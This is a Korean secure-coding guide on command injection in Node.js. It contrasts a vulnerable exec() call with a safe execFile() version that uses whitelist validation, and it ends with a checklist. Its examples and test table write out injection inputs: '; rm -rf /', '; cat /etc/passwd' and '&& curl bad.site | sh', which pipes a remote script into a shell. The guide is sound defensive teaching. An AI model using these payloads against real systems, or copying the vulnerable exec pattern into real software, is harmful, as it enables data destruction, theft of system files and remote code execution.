# 🛡️ Secure Coding - 명령어 삽입 (Command Injection)

**명령어 삽입(Command Injection)** 은 애플리케이션이 사용자 입력을 통해 **OS 명령어를 실행**할 때,  
입력값이 적절히 검증되지 않아 공격자가 임의의 시스템 명령어를 삽입하고 실행하는 보안 취약점입니다.

---

## 1️⃣ 명령어 삽입의 위험성

| 항목              | 설명 |
|-------------------|------|
| 시스템 명령 실행   | `rm -rf`, `cat /etc/passwd` 등 직접적인 시스템 조작 가능 |
| 권한 상승          | 관리자 권한으로 명령어가 실행되면 전체 시스템 탈취 가능 |
| 데이터 유출/파괴   | 내부 정보 출력, 파일 삭제, 백도어 삽입 등 |
| 악성코드 실행      | 외부에서 다운받은 스크립트 실행 등 |

---

## 2️⃣ 공격 예시

### 입력값: `; rm -rf /`

```js
const userInput = req.query.filename;
const exec = require('child_process').exec;
exec(`cat ${userInput}`, (err, stdout) => {
  res.send(stdout);
});
```

> 사용자가 `filename=abc.txt; rm -rf /` 입력 → 시스템 전체 삭제 가능

---

## 3️⃣ 안전한 구현 원칙

| 방법 | 설명 |
|------|------|
| OS 명령어 직접 실행 지양 | 가능하면 명령어 자체를 쓰지 않도록 설계 |
| 사용자 입력 검증         | 입력값에 허용된 값만 통과 (화이트리스트 방식) |
| 쉘 호출 대신 API 사용    | Node.js, Python 등에서 OS 명령어 대신 내장 API 활용 |
| 명령어 조합 금지         | 문자열로 명령어를 구성하지 말 것 |
| `exec` 대신 `spawn`, `execFile` 사용 | 파라미터를 분리해 전달하는 방식이 더 안전 |

---

## 4️⃣ 안전한 코드 예시

#### ❌ 취약한 방식 (Node.js)

```js
const userInput = req.query.file;
exec(`cat ${userInput}`, (err, out) => res.send(out));
```

#### ✅ 안전한 방식 (`execFile` 사용)

```js
const { execFile } = require('child_process');
const file = req.query.file;

// 화이트리스트 검증 예시
if (!/^[\w\-\.]+$/.test(file)) {
  return res.status(400).send('Invalid file name');
}

execFile('cat', [file], (err, stdout) => {
  if (err) return res.status(500).send('Error');
  res.send(stdout);
});
```

---

## 5️⃣ 체크리스트

- [ ] 사용자 입력값을 명령어에 직접 연결하고 있지 않은가?
- [ ] OS 명령어 대신 언어나 라이브러리 제공 API를 사용하고 있는가?
- [ ] 필요한 경우 명령어는 `exec`이 아닌 `spawn`, `execFile` 등으로 실행하고 있는가?
- [ ] 입력값에 허용된 형식(화이트리스트)을 적용하고 있는가?
- [ ] 명령 실행 후 에러/로그 처리는 안전하게 하고 있는가?

---

## 6️⃣ 테스트 시 참고

| 입력값 예시 | 기대 결과 | 실제 위험 |
|-------------|------------|-----------|
| `log.txt`   | 정상 출력 | - |
| `log.txt; cat /etc/passwd` | 차단되어야 함 | 시스템 파일 유출 가능 |
| `&& curl bad.site \| sh` | 차단되어야 함 | 외부 명령 실행 가능 |

---

## 🎯 정리

✔ Command Injection은 **입력값이 시스템 명령어에 삽입되어 실행되는 심각한 보안 취약점**  
✔ 가능하면 **OS 명령어 실행을 피하고**, 꼭 필요하면 **API 또는 `execFile`, `spawn` 등 안전한 방식** 사용  
✔ **입력값은 반드시 검증**, 문자열 명령어 조합 절대 금지  
✔ 작은 실수 하나가 시스템 전체를 날릴 수 있다 😱
